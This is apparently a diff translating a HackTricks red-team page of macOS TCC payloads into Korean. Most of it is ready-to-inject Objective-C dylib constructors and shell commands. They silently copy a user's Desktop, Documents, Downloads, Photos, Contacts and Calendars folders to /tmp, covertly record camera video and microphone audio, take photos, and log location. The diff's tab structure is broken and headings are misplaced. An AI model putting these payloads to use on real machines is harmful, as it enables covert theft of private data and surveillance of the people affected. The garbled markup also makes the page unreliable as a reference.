@@ -1,28 +1,27 @@
-# macOS TCC Payloads
+# macOS TCC 페이로드
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks를 지원하는 다른 방법:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
+* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.
 
 </details>
 
-### Desktop
+### 데스크탑
 
-* **Entitlement**: None
+* **권한**: 없음
 * **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
-Copy `$HOME/Desktop` to `/tmp/desktop`.
-
+{% tab title="Objective-C" %}
+`$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -34,46 +33,44 @@ Copy `$HOME/Desktop` to `/tmp/desktop`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
-    NSString *tmpPhotosPath = @"/tmp/desktop";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
+NSString *tmpPhotosPath = @"/tmp/desktop";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="Shell" %}
-Copy `$HOME/Desktop` to `/tmp/desktop`.
-
+{% tab title="쉘" %}
+`$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Documents
+### 문서
 
-* **Entitlement**: None
+* **권한**: 없음
 * **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-Copy `$HOME/Documents` to `/tmp/documents`.
-
+`$HOME/Documents`를 `/tmp/documents`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -85,46 +82,42 @@ Copy `$HOME/Documents` to `/tmp/documents`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
-    NSString *tmpPhotosPath = @"/tmp/documents";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+NSString *tmpPhotosPath = @"/tmp/documents";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
-{% endtab %}
-
 {% tab title="Shell" %}
-Copy `$HOME/`Documents to `/tmp/documents`.
-
+`$HOME/`Documents를 `/tmp/documents`로 복사합니다.
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Downloads
+### 다운로드
 
-* **Entitlement**: None
+* **권한**: 없음
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
-Copy `$HOME/Downloads` to `/tmp/downloads`.
-
+{% tab title="ObjectiveC" %}
+`$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -136,46 +129,42 @@ Copy `$HOME/Downloads` to `/tmp/downloads`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
-    NSString *tmpPhotosPath = @"/tmp/downloads";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
+NSString *tmpPhotosPath = @"/tmp/downloads";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
-{% endtab %}
-
 {% tab title="Shell" %}
-Copy `$HOME/Dowloads` to `/tmp/downloads`.
-
+`$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Photos Library
+### 사진 라이브러리
 
 * **Entitlement**: `com.apple.security.personal-information.photos-library`
 * **TCC**: `kTCCServicePhotos`
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.
-
+`$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -187,46 +176,42 @@ Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
-    NSString *tmpPhotosPath = @"/tmp/photos";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
+NSString *tmpPhotosPath = @"/tmp/photos";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
-{% endtab %}
-
 {% tab title="Shell" %}
-Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.
-
+`$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Contacts
+### 연락처
 
 * **Entitlement**: `com.apple.security.personal-information.addressbook`
 * **TCC**: `kTCCServiceAddressBook`
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.
-
+`$HOME/Library/Application Support/AddressBook`을 `/tmp/contacts`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -238,46 +223,44 @@ Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
-    NSString *tmpPhotosPath = @"/tmp/contacts";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
+NSString *tmpPhotosPath = @"/tmp/contacts";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="Shell" %}
-Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.
-
+{% tab title="쉘" %}
+`$HOME/Library/Application Support/AddressBook`를 `/tmp/contacts`로 복사합니다.
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Calendar
+### 캘린더
 
-* **Entitlement**: `com.apple.security.personal-information.calendars`
+* **권한**: `com.apple.security.personal-information.calendars`
 * **TCC**: `kTCCServiceCalendar`
 
 {% tabs %}
 {% tab title="ObjectiveC" %}
-Copy `$HOME/Library/Calendars` to `/tmp/calendars`.
-
+`$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -289,46 +272,36 @@ Copy `$HOME/Library/Calendars` to `/tmp/calendars`.
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    NSError *error = nil;    
+NSFileManager *fileManager = [NSFileManager defaultManager];
+NSError *error = nil;
 
-    // Get the path to the user's Pictures folder
-    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
-    NSString *tmpPhotosPath = @"/tmp/calendars";
+// Get the path to the user's Pictures folder
+NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
+NSString *tmpPhotosPath = @"/tmp/calendars";
 
-    // Copy the contents recursively
-    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
-        NSLog(@"Error copying items: %@", error);
-    }
+// Copy the contents recursively
+if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
+NSLog(@"Error copying items: %@", error);
+}
 
-    NSLog(@"Copy completed successfully.", error);
+NSLog(@"Copy completed successfully.", error);
 
-    fclose(stderr); // Close the file stream
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="Shell" %}
-Copy `$HOME/Library/Calendars` to `/tmp/calendars`.
-
+{% tab title="쉘" %}
+`$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
-{% endtab %}
-{% endtabs %}
-
-### Camera
-
-* **Entitlement**: `com.apple.security.device.camera`
-* **TCC**: `kTCCServiceCamera`
-
 {% tabs %}
-{% tab title="ObjetiveC - Record" %}
-Record a 3s video and save it in **`/tmp/recording.mov`**
-
+{% tab title="ObjetiveC - 녹화" %}
+3초 동영상을 녹화하고 **`/tmp/recording.mov`**에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -345,70 +318,73 @@ Record a 3s video and save it in **`/tmp/recording.mov`**
 @end
 @implementation VideoRecorder
 - (instancetype)init {
-    self = [super init];
-    if (self) {
-        [self setupCaptureSession];
-    }
-    return self;
+self = [super init];
+if (self) {
+[self setupCaptureSession];
+}
+return self;
 }
 - (void)setupCaptureSession {
-    self.captureSession = [[AVCaptureSession alloc] init];
-    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
-    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
-    NSError *error;
-    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
-    if (error) {
-        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
-        return;
-    }
-    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
-        [self.captureSession addInput:self.videoDeviceInput];
-    }
-    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
-    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
-        [self.captureSession addOutput:self.movieFileOutput];
-    }
+self.captureSession = [[AVCaptureSession alloc] init];
+self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
+NSError *error;
+self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
+if (error) {
+NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
+return;
+}
+if ([self.captureSession canAddInput:self.videoDeviceInput]) {
+[self.captureSession addInput:self.videoDeviceInput];
+}
+self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+if ([self.captureSession canAddOutput:self.movieFileOutput]) {
+[self.captureSession addOutput:self.movieFileOutput];
+}
 }
 - (void)startRecording {
-    [self.captureSession startRunning];
-    NSString *outputFilePath = @"/tmp/recording.mov";
-    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
-    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
-    NSLog(@"Recording started");
+[self.captureSession startRunning];
+NSString *outputFilePath = @"/tmp/recording.mov";
+NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+NSLog(@"Recording started");
 }
 - (void)stopRecording {
-    [self.movieFileOutput stopRecording];
-    [self.captureSession stopRunning];
-    NSLog(@"Recording stopped");
+[self.movieFileOutput stopRecording];
+[self.captureSession stopRunning];
+NSLog(@"Recording stopped");
 }
 #pragma mark - AVCaptureFileOutputRecordingDelegate
 - (void)captureOutput:(AVCaptureFileOutput *)captureOutput
 didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
-      fromConnections:(NSArray<AVCaptureConnection *> *)connections
-                error:(NSError *)error {
-    if (error) {
-        NSLog(@"Recording failed: %@", [error localizedDescription]);
-    } else {
-        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
-    }
+fromConnections:(NSArray<AVCaptureConnection *> *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording failed: %@", [error localizedDescription]);
+} else {
+NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+}
 }
 @end
 __attribute__((constructor))
 static void myconstructor(int argc, const char **argv) {
-    freopen("/tmp/logs.txt", "a", stderr);
-    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
-    [videoRecorder startRecording];
-    [NSThread sleepForTimeInterval:3.0];
-    [videoRecorder stopRecording];
-    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
-    fclose(stderr); // Close the file stream
+freopen("/tmp/logs.txt", "a", stderr);
+VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
+[videoRecorder startRecording];
+[NSThread sleepForTimeInterval:3.0];
+[videoRecorder stopRecording];
+[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="ObjectiveC - Check" %}
-Check if the program has access to the camera.
+{% tab title="ObjectiveC - 확인" %}
+카메라에 대한 프로그램의 접근 권한을 확인합니다.
+{% endtab %}
 
+{% tab title="Swift - Check" %}
+Check if the program has access to the camera.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -421,43 +397,42 @@ Check if the program has access to the camera.
 @end
 @implementation CameraAccessChecker
 + (BOOL)hasCameraAccess {
-    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
-    if (status == AVAuthorizationStatusAuthorized) {
-        NSLog(@"[+] Access to camera granted.");
-        return YES;
-    } else {
-        NSLog(@"[-] Access to camera denied.");
-        return NO;
-    }
+AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+if (status == AVAuthorizationStatusAuthorized) {
+NSLog(@"[+] Access to camera granted.");
+return YES;
+} else {
+NSLog(@"[-] Access to camera denied.");
+return NO;
+}
 }
 @end
 __attribute__((constructor))
 static void telegram(int argc, const char **argv) {
-    freopen("/tmp/logs.txt", "a", stderr);
-    [CameraAccessChecker hasCameraAccess];
-    fclose(stderr); // Close the file stream
+freopen("/tmp/logs.txt", "a", stderr);
+[CameraAccessChecker hasCameraAccess];
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="Shell" %}
-Take a photo with the camera
-
+{% tab title="쉘" %}
+카메라로 사진을 찍습니다.
+{% endtab %}
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {% endtab %}
 {% endtabs %}
 
-### Microphone
+### 마이크
 
-* **Entitlement**: **com.apple.security.device.audio-input**
+* **권한**: **com.apple.security.device.audio-input**
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="ObjetiveC - Record" %}
-Record 5s of audio an store it in `/tmp/recording.m4a`
-
+{% tab title="ObjectiveC - 녹음" %}
+5초 동안 오디오를 녹음하고 `/tmp/recording.m4a`에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -479,63 +454,63 @@ Record 5s of audio an store it in `/tmp/recording.m4a`
 @implementation AudioRecorder
 
 - (instancetype)init {
-    self = [super init];
-    if (self) {
-        [self setupCaptureSession];
-    }
-    return self;
+self = [super init];
+if (self) {
+[self setupCaptureSession];
+}
+return self;
 }
 
 - (void)setupCaptureSession {
-    self.captureSession = [[AVCaptureSession alloc] init];
-    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
+self.captureSession = [[AVCaptureSession alloc] init];
+self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
 
-    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
-    NSError *error;
-    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];
+AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
+NSError *error;
+self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];
 
-    if (error) {
-        NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
-        return;
-    }
+if (error) {
+NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
+return;
+}
 
-    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
-        [self.captureSession addInput:self.audioDeviceInput];
-    }
+if ([self.captureSession canAddInput:self.audioDeviceInput]) {
+[self.captureSession addInput:self.audioDeviceInput];
+}
 
-    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
+self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
 
-    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
-        [self.captureSession addOutput:self.audioFileOutput];
-    }
+if ([self.captureSession canAddOutput:self.audioFileOutput]) {
+[self.captureSession addOutput:self.audioFileOutput];
+}
 }
 
 - (void)startRecording {
-    [self.captureSession startRunning];
-    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
-    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
-    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
-    NSLog(@"Recording started");
+[self.captureSession startRunning];
+NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
+NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
+[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
+NSLog(@"Recording started");
 }
 
 - (void)stopRecording {
-    [self.audioFileOutput stopRecording];
-    [self.captureSession stopRunning];
-    NSLog(@"Recording stopped");
+[self.audioFileOutput stopRecording];
+[self.captureSession stopRunning];
+NSLog(@"Recording stopped");
 }
 
 #pragma mark - AVCaptureFileOutputRecordingDelegate
 
 - (void)captureOutput:(AVCaptureFileOutput *)captureOutput
 didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
-      fromConnections:(NSArray<AVCaptureConnection *> *)connections
-                error:(NSError *)error {
-    if (error) {
-        NSLog(@"Recording failed: %@", [error localizedDescription]);
-    } else {
-        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
-    }
-    NSLog(@"Saved to %@", outputFileURL.path);
+fromConnections:(NSArray<AVCaptureConnection *> *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording failed: %@", [error localizedDescription]);
+} else {
+NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
+}
+NSLog(@"Saved to %@", outputFileURL.path);
 }
 
 @end
@@ -543,22 +518,22 @@ didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
 __attribute__((constructor))
 static void myconstructor(int argc, const char **argv) {
 
-    freopen("/tmp/logs.txt", "a", stderr);
-    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
+freopen("/tmp/logs.txt", "a", stderr);
+AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
 
-    [audioRecorder startRecording];
-    [NSThread sleepForTimeInterval:5.0];
-    [audioRecorder stopRecording];
+[audioRecorder startRecording];
+[NSThread sleepForTimeInterval:5.0];
+[audioRecorder stopRecording];
 
-    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
-    fclose(stderr); // Close the file stream
+[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+fclose(stderr); // Close the file stream
 }
 ```
 {% endtab %}
 
-{% tab title="ObjectiveC - Check" %}
-Check if the app has access to the mricrophone.
-
+{% tab title="ObjectiveC - 확인" %}
+앱이 마이크에 접근할 수 있는지 확인합니다. 
+{% endtab %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -571,26 +546,23 @@ Check if the app has access to the mricrophone.
 @end
 @implementation MicrophoneAccessChecker
 + (BOOL)hasMicrophoneAccess {
-    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
-    if (status == AVAuthorizationStatusAuthorized) {
-        NSLog(@"[+] Access to microphone granted.");
-        return YES;
-    } else {
-        NSLog(@"[-] Access to microphone denied.");
-        return NO;
-    }
+AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
+if (status == AVAuthorizationStatusAuthorized) {
+NSLog(@"[+] Access to microphone granted.");
+return YES;
+} else {
+NSLog(@"[-] Access to microphone denied.");
+return NO;
+}
 }
 @end
 __attribute__((constructor))
 static void telegram(int argc, const char **argv) {
-    [MicrophoneAccessChecker hasMicrophoneAccess];
+[MicrophoneAccessChecker hasMicrophoneAccess];
 }
 ```
-{% endtab %}
-
 {% tab title="Shell" %}
-Record a 5s audio and store it in `/tmp/recording.wav`
-
+5초 동안 오디오를 녹음하고 `/tmp/recording.wav`에 저장합니다.
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -600,19 +572,18 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% endtab %}
 {% endtabs %}
 
-### Location
+### 위치
 
 {% hint style="success" %}
-For an app to get the location, **Location Services** (from Privacy & Security) **must be enabled,** if not it won't be able to access it.
+앱이 위치 정보를 얻으려면, **위치 서비스**(개인 정보 및 보안에서)가 **활성화되어 있어야** 합니다. 그렇지 않으면 앱은 위치 정보에 접근할 수 없습니다.
 {% endhint %}
 
 * **Entitlement**: `com.apple.security.personal-information.location`
-* **TCC**: Granted in `/var/db/locationd/clients.plist`
+* **TCC**: `/var/db/locationd/clients.plist`에서 허용됨
 
 {% tabs %}
 {% tab title="ObjectiveC" %}
-Write the location in `/tmp/logs.txt`
-
+`/tmp/logs.txt`에 위치 정보를 기록하세요.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -625,60 +596,51 @@ Write the location in `/tmp/logs.txt`
 @implementation LocationManagerDelegate
 
 - (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
-    CLLocation *location = [locations lastObject];
-    NSLog(@"Current location: %@", location);
-    exit(0); // Exit the program after receiving the first location update
+CLLocation *location = [locations lastObject];
+NSLog(@"Current location: %@", location);
+exit(0); // Exit the program after receiving the first location update
 }
 
 - (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
-    NSLog(@"Error getting location: %@", error);
-    exit(1); // Exit the program on error
+NSLog(@"Error getting location: %@", error);
+exit(1); // Exit the program on error
 }
 
 @end
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-{  
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+{
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
-    NSLog(@"Getting location");
-    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
-    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
-    locationManager.delegate = delegate;
+NSLog(@"Getting location");
+CLLocationManager *locationManager = [[CLLocationManager alloc] init];
+LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
+locationManager.delegate = delegate;
 
-    [locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
-    [locationManager startUpdatingLocation];
+[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
